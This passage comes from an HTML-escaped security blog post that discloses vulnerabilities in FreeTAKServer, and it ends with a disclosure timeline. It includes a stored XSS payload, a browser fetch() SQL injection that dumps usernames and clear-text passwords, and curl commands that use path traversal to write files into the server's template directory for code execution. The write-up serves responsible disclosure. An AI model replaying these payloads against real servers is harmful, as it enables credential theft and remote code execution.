  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;latitudeDest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;39.940&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;longitudeDest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;-75.01385&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2022-25507-xss-through-emergency-alert&quot;&gt;[CVE-2022-25507] XSS through Emergency Alert&lt;/h3&gt;

&lt;p&gt;In the FreeTAKServer-UI there is a function to create and view Emergency Alerts that are originating from either the End User Device or from the UI itself. Both Avenues are susceptible to a Stored Cross Site scripting vulnerability in the Callsign parameter.&lt;/p&gt;

&lt;h5 id=&quot;web-interface&quot;&gt;Web Interface&lt;/h5&gt;

&lt;p&gt;In the case of a XSS in the WebUI it is as simple as having a callsign with the payload of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src onerror=alert(/payload/)&amp;gt;&lt;/code&gt; which will trigger the Emergency function and display the emergency in the WebUI.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_webui_payload.jpg&quot; alt=&quot;XSS WebUI Payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_webui_alert.jpg&quot; alt=&quot;XSS WebUI Alert&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;end-user-device&quot;&gt;End User Device&lt;/h5&gt;
&lt;p&gt;What’s more interesting of a scenario is that it is possible to push Emergencies from any of the EUDs, these can range from a 911, TIC (Troops in Contact) or similar. This Emergency will broadcast to each EUD (Which are not affected) but also shown in the WebUI, again triggering the XSS payload.&lt;/p&gt;

&lt;p&gt;This can be chained together with the API keys in the reponse in order to obtain a server RestAPI key for further exploitation, which can take a normal user in the field to a Web Server admin&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_enduserdevice_alert.jpg&quot; alt=&quot;XSS End User Device Payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_enduserdevice_webui_payload.jpg&quot; alt=&quot;XSS End User Device WebUI Payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_enduserdevice_alert.jpg&quot; alt=&quot;XSS End User Device WebUI Alert&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2022-25506-sql-injection-on-authenticateuser&quot;&gt;[CVE-2022-25506] SQL Injection on AuthenticateUser&lt;/h3&gt;

&lt;p&gt;The API endpoint AuthenticateUser contains a SQL Injection into the SQLite3 Database that is handling the authentication process of the SystemUsers. In order to exploit this vulnerability the attacker need to possess a valid API key, which can either be leaked through the XSS to a End User Device, or given as a part of the UAV Operator ability which broadcasts the GPS and Video feed of a UAV-Drone.&lt;br /&gt;
From the SQL Injection it is possible to list all the Username, UsedID and Clear-Text passwords in the database.&lt;/p&gt;

&lt;h5 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h5&gt;

&lt;p&gt;Posting the follwing snippet into a web browsers console will trigger the SQL Injection and return the name and password for each user in the SystemUsers table.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fetch(&quot;http://atak.FreeTAKServer.com:19023/AuthenticateUser?username=abc\&quot; UNION SELECT (SELECT group_concat(name||':'||password) FROM SystemUser),'b','c','PASSWORD','d','e'--&amp;amp;password=PASSWORD&quot;, {
    &quot;headers&quot;: {
      &quot;accept&quot;: &quot;*/*&quot;,
      &quot;accept-language&quot;: &quot;en-US,en;q=0.9&quot;,
      &quot;authorization&quot;: &quot;Bearer ValidAPIKey&quot;,
      &quot;content-type&quot;: &quot;application/json&quot;
    },
    &quot;mode&quot;: &quot;cors&quot;
  });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will return the following response:&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/sqli_response.jpg&quot; alt=&quot;SQL Injection Response, Network Tab&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which clearly shows the database results in clear-text.&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-file-write-remote-code-execution&quot;&gt;Arbitrary File Write (Remote Code Execution)&lt;/h3&gt;

&lt;p&gt;In the TAK EcoSystem there exists a file sharing function for mission essential items called DataPackages, these can be shared either by Peer-to-Peer transmission, or saved on the TAK-Server for later downloading and sharing.&lt;/p&gt;

&lt;p&gt;During the analysis we encountered two specific endpoints in the FreeTAKServer software that can be abused as a Arbitrary File Write, which inturn can be leveraged into Remote Code Execution through either a Cron job (depending on the accesslevel for the user running FTS) or through the Flask Templating functions.&lt;/p&gt;

&lt;h5 id=&quot;cve-2022-25511-user-interface-datapackage&quot;&gt;[CVE-2022-25511] User Interface Datapackage&lt;/h5&gt;

&lt;p&gt;From the WebUI it is possible to (once logged in) upload DataPackages directly to the server so that it is possible to download the zipped files on the EUD in the field.
The route &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/DataPackageTable&lt;/code&gt; takes an argument &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?filename=&lt;/code&gt; which is not sanitized for either the Path or the Filename outside of the UI, which creates the issues that you can place any file, anywhere on the system. Albeit going this route will add some junk XML data into the end of the file, this making it extremely hard to achieve code execution through Python or Flask Templating.
This was achieved using a transparent proxy to catch and modify the webrequest, but can also be achieved using something like &lt;a href=&quot;https://curl.se/&quot;&gt;Curl&lt;/a&gt;&lt;/p&gt;

&lt;h6 id=&quot;proof-of-concept-1&quot;&gt;Proof Of Concept&lt;/h6&gt;

&lt;p&gt;Request through Burpsuite:&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_webui_request.jpg&quot; alt=&quot;Burpsuite Request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;File on system:&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_webui_tmp-file.jpg&quot; alt=&quot;File on system&quot; /&gt;&lt;br /&gt;
(Note that the webserver is at that moment run as root, &lt;em&gt;Not Recommended&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;Bash equivalent PoC:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Host: atak.FreeTAKServer.com:19023'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Authorization: Bearer ValidRestAPIToken'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOUUxfHjKyflBjjhn'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept-Encoding: gzip, deflate'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-binary&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'------WebKitFormBoundaryOUUxfHjKyflBjjhn\x0d\x0aContent-Disposition: form-data; name=\&quot;assetfile\&quot;; filename=\&quot;test.ext\&quot;\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0aThisIs FromDataPackageTable\x0d\x0a\x0d\x0a------WebKitFormBoundaryOUUxfHjKyflBjjhn--\x0d\x0a'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://atak.FreeTAKServer.com:19023/DataPackageTable?filename=../../../../../../../../tmp/file.ext&amp;amp;creator='&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;end-user-device-missionupload&quot;&gt;End User Device MissionUpload&lt;/h5&gt;

&lt;p&gt;Every End User Device also has the ability to upload files and Datapackages for sharing and consumption elsewhere, this is done through a Marti API that is specific to the EUDs. Although the Marti API is just another RestAPI that is used in the applications but can be abused over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP/8080&lt;/code&gt; or the SSL equivalent (Given a valid user certificate) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP/8443&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The difference between the WebUI way and the Marti way is that it does not add junk at the end of the file, as the EUDs are responsible for creating valid DataPackages.&lt;/p&gt;

&lt;p&gt;Function &lt;a href=&quot;https://github.com/FreeTAKTeam/FreeTakServer/blob/2fc5089c431abcf2e4bce0f4030ad22222444ef4/FreeTAKServer/controllers/services/DataPackageServer.py#L155&quot;&gt;Sourcecode&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/Marti/sync/missionupload'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;FreeTAKServer.model.ServiceObjects.SSLDataPackageVariables&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLDataPackageVariables&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dataoackage upload started'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;file_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Package hash = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;letters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_letters&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'uid-'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'filename'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;creatorUid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'creatorUid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'assetfile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;fileSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;callsign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;FlaskFunctions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getSubmissionUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;creatorUid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;n&quot;&gt;dbController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# fetchone() gives a tuple, so only grab the first element
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;FlaskFunctions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_dp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dbController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SubmissionUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callsign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;CreatorUid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;creatorUid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;USINGSSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPPORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Marti/api/sync/metadata/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tool&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPPORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Marti/api/sync/metadata/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tool&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Whats visible in the vulnerable code block is that the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash&lt;/code&gt; is passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.path.join((str(directory), filename))&lt;/code&gt; which when supplied alot of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; (8 to be exact) it puts the base directory at the root of the filesystem and then the file is put wherever its directed (given write permissions)&lt;/p&gt;

&lt;p&gt;Note that this does not require any &lt;em&gt;authentication&lt;/em&gt; only that you are connected to the FreeTAKServer with a valid connection.&lt;/p&gt;

&lt;h6 id=&quot;proof-of-concept-2&quot;&gt;Proof of Concept&lt;/h6&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;assetfile=@rce.html&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://atak.FreeTAKServer.com:8080/Marti/sync/missionupload?hash=/../../../../../../../usr/local/lib/python3.8/dist-packages/FreeTAKServer-UI/app/home/templates/&amp;amp;filename=janne2.html&amp;amp;creatorUid=&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sending the file contents to the missionupload endpoint results in a valid response and browsing to the file on the WebUI results in Code Execution:&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_marti_curl.jpg&quot; alt=&quot;Marti curl request and file contents&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The file will be uploaded to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/lib/python3.8/dist-packages/FreeTAKServer-UI/app/home/templates&lt;/code&gt; which is where the Flask server is hosting its files from.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_marti_result.jpg&quot; alt=&quot;Code Execution through Templating&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In discussions with the developers, they mentioned that FreeTAKServer is Unsafe due to the architecture and should not be accessible to the public internet but only ran inside a trusted network.&lt;/p&gt;

&lt;h2 id=&quot;disclosure-timeline&quot;&gt;Disclosure Timeline&lt;/h2&gt;

&lt;p&gt;14-02-2022 Discovered Vulnerabilities&lt;br /&gt;
15-02-2022 Wrote this Blog post&lt;br /&gt;
15-02-2022 Disclosed to developers&lt;br /&gt;
16-02-2022 Applied for CVE Through MITRE&lt;br /&gt;
